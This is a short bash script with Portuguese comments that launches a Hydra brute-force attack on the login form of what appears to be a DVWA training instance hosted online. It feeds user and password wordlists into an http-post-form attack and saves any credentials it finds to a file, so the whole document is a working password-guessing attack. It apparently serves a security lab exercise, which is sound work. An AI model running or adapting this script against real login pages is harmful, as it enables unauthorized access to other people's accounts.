#!/bin/bash

# Play 02 — Hydra DVWA em produção
# Usa variável DVWA_HOST ou default (sem incluir :80 no TARGET)

# Host do DVWA (sem porta)
TARGET="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

echo "[*] Iniciando ataque com Hydra contra $TARGET:80..."

# Identifica de onde o script está sendo executado,
# usando BASH_SOURCE para pegar o path real do script
SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"

# Define paths absolutos para os arquivos de credenciais
USERS_FILE="$SCRIPT_DIR/users.txt"
PASS_FILE="$SCRIPT_DIR/passwords.txt"
OUTPUT_FILE="$SCRIPT_DIR/hydra-out.txt"

# Executa o Hydra apontando diretamente para os arquivos
hydra -s 80 \
  -L "$USERS_FILE" \
  -P "$PASS_FILE" \
  "http-post-form://$TARGET/login.php:username=^USER^&password=^PASS^&Login=Login failed" \
  -o "$OUTPUT_FILE" 2>&1

echo "[✔️] Teste concluído com sucesso."
